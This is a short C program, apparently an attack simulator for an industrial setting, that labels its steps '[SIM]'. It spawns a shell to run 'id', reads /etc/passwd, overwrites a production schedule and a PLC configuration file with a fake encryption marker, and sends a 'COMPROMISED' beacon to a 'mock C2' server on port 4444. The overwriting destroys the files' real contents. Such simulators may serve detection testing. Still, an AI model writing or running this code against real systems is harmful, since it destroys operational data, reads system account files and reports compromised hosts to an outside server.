#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <arpa/inet.h>

int main() {
    printf("[SIM] 1. Spawning child process...\n");
    pid_t pid = fork();
    if (pid == 0) {
        char *args[] = {"/bin/sh", "-c", "id; ps aux > /dev/null", NULL};
        execve("/bin/sh", args, NULL);
        exit(1);
    } else if (pid > 0) {
        waitpid(pid, NULL, 0);
    }

    printf("[SIM] 2. Reading /etc/passwd...\n");
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd >= 0) {
        char buf[256];
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        if (n > 0) { buf[n] = '\0'; }
        close(fd);
    }

    printf("[SIM] 3. Tampering critical_data...\n");
    const char *targets[] = {"/app/critical_data/production_schedule.csv", "/app/critical_data/plc_config.json"};
    const char *msg = "ENCRYPTED_BY_SIMULATOR_DEMO_PAYLOAD_0xDEADBEAF\n";
    for (int i = 0; i < 2; i++) {
        int tfd = open(targets[i], O_WRONLY | O_TRUNC);
        if (tfd >= 0) { write(tfd, msg, strlen(msg)); close(tfd); }
    }

    printf("[SIM] 4. Connecting to mock C2...\n");
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(4444) };
    inet_pton(AF_INET, "172.28.1.99", &addr.sin_addr);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        send(sock, "BEACON|HOST=target-server|STATUS=COMPROMISED\n", 45, 0);
        sleep(2);
    }
    close(sock);
    return 0;
}
